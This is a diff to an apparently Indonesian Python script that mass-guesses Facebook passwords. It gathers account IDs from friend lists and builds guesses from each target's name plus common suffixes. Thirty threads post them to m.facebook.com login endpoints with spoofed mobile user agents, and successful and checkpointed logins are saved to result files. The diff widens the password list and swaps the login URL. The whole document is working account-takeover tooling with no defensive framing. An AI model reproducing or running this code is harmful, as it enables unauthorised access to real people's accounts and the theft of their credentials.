@@ -40,23 +40,23 @@ for xd in range(10000):
     i=random.randrange(1, 4)
     j=random.randrange(1, 4)
     k='Mobile Safari/535.1'
-    uaku=(f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36')
+    uaku=(f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36')
     ugen2.append(uaku)
 
 
-    aa='Mozilla/5.0 (Windows NT'
+    aa='Mozilla/5.0 (Linux; Adroid'
     b=random.choice(['6','7','8','9','10','11','12'])
-    c='Win64; x64)'
+    c='M2010J19CG Build/SKQ1.211202.001; wv)'
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     e=random.randrange(1, 999)
     f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
     h=random.randrange(73,100)
     i='0'
     j=random.randrange(4200,4900)
     k=random.randrange(40,150)
     l='Mobile Safari/537.36'
-    uaku2=(f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36')
+    uaku2=(f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36')
     ugen.append(uaku2)
 def uaku():
 	try:
@@ -114,10 +114,9 @@ def back():
 	login()
 #------------------[KONTOL]-----------------#
 def banner():
-	nazri_ganteng('=' * 40)
+	nazri_ganteng('──' * 25)
 	print(f"""""")
-	nazri_ganteng(f"""(=)PREMIUM\n(=)Whatsapp:{M} Private\n(=){P}GHS|PGSOFT""")
-	nazri_ganteng('=' * 40)
+	nazri_ganteng('──'* 25)
 #--------------------[ MASUK ]--------------#
 def login():
 	try:
@@ -274,15 +273,19 @@ def menu(my_name,my_id):
 		login_lagi334()
 	os.system('clear')
 	banner()
+	tgl = datetime.datetime.now().day
+	bln = dic[(str(datetime.datetime.now().month))]
+	thn = datetime.datetime.now().year
 	ip = requests.get("https://api.ipify.org").text
-	nazri_ganteng(f'└─ Your Id  : '+str(my_id))
-	nazri_ganteng(f'└─ Your Ip  : {ip}')
-	print(f'└─ Github   : Asep Yusup')
-	nazri_ganteng('=' * 40)
-	cetak('[bold green] [•]1. Crack Public\n[•]2. Cek Result\n[•]0. Exit[bold green]')
-	nazri_ganteng('=' * 40)
+	nazri_ganteng(f'ID    : '+str(my_id))
+	nazri_ganteng(f'Nama  : {my_name}')
+	nazri_ganteng(f'IP    : {ip}')
+	nazri_ganteng(f'TTL   : '+str(tgl)+'-'+str(bln)+'-'+str(thn))
+	nazri_ganteng('──'* 25)
+	cetak('[bold green] [•]1. CRACK MASSAL\n [•]2. CEK HASIL\n [•]0. KELUAR(hapus kuki)[bold green]')
+	nazri_ganteng('──'* 25)
 	nazri_cool_banget = input('└─ Select : ')
-	nazri_ganteng('=' * 40)
+	nazri_ganteng('──'* 25)
 	if nazri_cool_banget in ['1']:
 		dump_massal()
 	elif nazri_cool_banget in ['2']:
@@ -405,7 +408,7 @@ def dump_massal():
 	except IOError:
 		exit()
 	try:
-		jum = int(input('└─ input target amount ? : '))
+		jum = int(input('└─ Berapa ID? : '))
 	except ValueError:
 		print('└─ wrong input ')
 		exit()
@@ -416,9 +419,9 @@ def dump_massal():
 	yz = 0
 	for met in range(jum):
 		yz+=1
-		kl = input('└─ Enter the Id '+str(yz)+' : ')
+		kl = input('└─ Masukan ID akun '+str(yz)+' : ')
 		uid.append(kl)
-	nazri_ganteng('=' * 40)
+	nazri_ganteng(f'{P}──'* 25)
 	for userr in uid:
 		try:
 			headers = {
@@ -451,21 +454,21 @@ def dump_massal():
 			print('└─ unstable signal ')
 			exit()
 	try:
-		print(f'Total Id Collected {h}'+str(len(id)))
+		print(f'Total ID {m}'+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		print(f'{x}')
 		print('└─ unstable signal ')
 		back()
 	except (KeyError,IOError):
-		print(f'└─{k} Friendship Not Public {x}')
+		print(f'└─ {P}Friendship Not Public {x}')
 		time.sleep(3)
 		back()
 #-------------[ PENGATURAN-IDZ ]---------------#
 def setting():
-	nazri_ganteng('=' * 40)
+	nazri_ganteng('──'* 25)
 	cetak('[bold green] [•]1. Akun Old\n [•]2. Akun New (Disarankan)\n [•]3. Akun Acak[bold green]')
-	nazri_ganteng('=' * 40)
+	nazri_ganteng('──'* 25)
 	hu = input('[•]Pilih : ')
 	if hu in ['1','01']:
 		for tua in sorted(id):
@@ -490,15 +493,15 @@ def setting():
 		print('')
 		
 	print('')
-	print(f'''{x}[1]. m.facebook.com''')
+	print(f'''{x}Ketik Y''')
 	print('')
 	hc = input('╰─ Chouse : ')
-	if hc in ['1','01']:
+	if hc in ['Y','y']:
 		method.append('mobile')
 	else:
 		method.append('mobile')
 	pwplus=input('╰─ Add Password Manual y/t > ')
-	nazri_ganteng('=' * 40)
+	nazri_ganteng('──'* 25)
 	if pwplus in ['y','Y']:
 		pwpluss.append('ya')
 		cetak('Masukkan kata sandi tambahan minimal 6 karakter\nContoh :[green] Indonesia,rahasia,katasandi[white] ')
@@ -509,16 +512,15 @@ def setting():
 	else:
 		pwpluss.append('no')
 	passwrd()
-	nazri_ganteng('=' * 40)
+	nazri_ganteng('──'* 25)
 #-------------------[ BAGIAN-WORDLIST ]------------#
 def passwrd():
 	global prog,des
-	nazri_ganteng('=' * 40)
-	print(f'└─ Results {h}OK{x} Save in : {h}OK/%s {x}'%(okc))
-	print(f'└─ Results {k}CP{x} Save in : {k}CP/%s {x}'%(cpc))
-	print(f'└─ Mohon Sabar,Di Karenakan Metode Sangat Lambat')
-	print(f'└─ Play Airplane Mode Every {m}500 ID\n')
-	nazri_ganteng('=' * 40);prog = Progress(SpinnerColumn('earth'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'));des = prog.add_task('',total=len(id))
+	nazri_ganteng('──'* 25)
+	print(f'└─ hasil {h}OK{x} Tersimpan Di {h}OK/%s {x}'%(okc))
+	print(f'└─ hasil {k}CP{x} Tersimpan Di {k}CP/%s {x}'%(cpc))
+	print(f'WAITING/TUNGGULAH\n')
+	nazri_ganteng('──'* 25);prog = Progress(SpinnerColumn('earth'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'));des = prog.add_task('',total=len(id))
 	with prog:
 		with tred(max_workers=30) as pool:
 			for yuzong in id2:
@@ -534,9 +536,24 @@ def passwrd():
 						pwv.append(nmf)
 					else:
 						pwv.append(nmf)
-						pwv.append(frs+'123')
-						pwv.append(frs+'1234')
-						pwv.append(frs+'12345')
+					pwv.append(frs+'01')
+					pwv.append(frs+'02')
+					pwv.append(frs+'03')
+					pwv.append(frs+'04')
+					pwv.append(frs+'05')
+					pwv.append(frs+'06')
+					pwv.append(frs+'07')
+					pwv.append(frs+'08')
+					pwv.append(frs+'09')
+					pwv.append(frs+'10')
+					pwv.append(frs+'111')
+					pwv.append(frs+'123')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'123456')
+					pwv.append(frs+'12345')
+					pwv.append(frs+'321')
+					pwv.append(frs+'00')
+					pwv.append(frs+'000')
 				if 'ya' in pwpluss:
 					for xpwd in pwnya:
 						pwv.append(xpwd)
@@ -572,11 +589,11 @@ def crack(idf,pwv):
 	for pw in pwv:
 		try:
 			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
-			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=799063067916842&kid_directed_site=0&app_id=799063067916842&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fapp_id%3D799063067916842%26cbt%3D1697315405849%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df107332bd16fa34%2526domain%253Dwww.digimap.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.digimap.co.id%25252Ff9dddded8d1374%2526relation%253Dopener%26client_id%3D799063067916842%26display%3Dtouch%26domain%3Dwww.digimap.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.digimap.co.id%252Flogin%26locale%3Den_US%26logger_id%3Df81df0319ce4dc%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df34290959a6d4cc%2526domain%253Dwww.digimap.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.digimap.co.id%25252Ff9dddded8d1374%2526relation%253Dopener%2526frame%253Df34154227dfa4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv13.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df34290959a6d4cc%26domain%3Dwww.digimap.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.digimap.co.id%252Ff9dddded8d1374%26relation%3Dopener%26frame%3Df34154227dfa4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
+			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
 			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v13.0/dialog/oauth?app_id=799063067916842&cbt=1697315405849&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df107332bd16fa34%26domain%3Dwww.digimap.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.digimap.co.id%252Ff9dddded8d1374%26relation%3Dopener&client_id=799063067916842&display=touch&domain=www.digimap.co.id&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fwww.digimap.co.id%2Flogin&locale=en_US&logger_id=f81df0319ce4dc&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df34290959a6d4cc%26domain%3Dwww.digimap.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.digimap.co.id%252Ff9dddded8d1374%26relation%3Dopener%26frame%3Df34154227dfa4&response_type=token%2Csigned_request%2Cgraph_domain&scope=public_profile%2Cemail&sdk=joey&version=v13.0&refsrc=deprecated&ret=login&fbapp_pres=0&tp=unspecified","flow":"login_no_pin","pass":pw,}
 			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
 			koki+=' m_pixel_ratio=2.625; wd=412x756'
-			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=799063067916842&kid_directed_site=0&app_id=799063067916842&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fapp_id%3D799063067916842%26cbt%3D1697315405849%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df107332bd16fa34%2526domain%253Dwww.digimap.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.digimap.co.id%25252Ff9dddded8d1374%2526relation%253Dopener%26client_id%3D799063067916842%26display%3Dtouch%26domain%3Dwww.digimap.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.digimap.co.id%252Flogin%26locale%3Den_US%26logger_id%3Df81df0319ce4dc%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df34290959a6d4cc%2526domain%253Dwww.digimap.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.digimap.co.id%25252Ff9dddded8d1374%2526relation%253Dopener%2526frame%253Df34154227dfa4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv13.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df34290959a6d4cc%26domain%3Dwww.digimap.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.digimap.co.id%252Ff9dddded8d1374%26relation%3Dopener%26frame%3Df34154227dfa4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
+			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print(f'{K}RESULTS {cpc}')
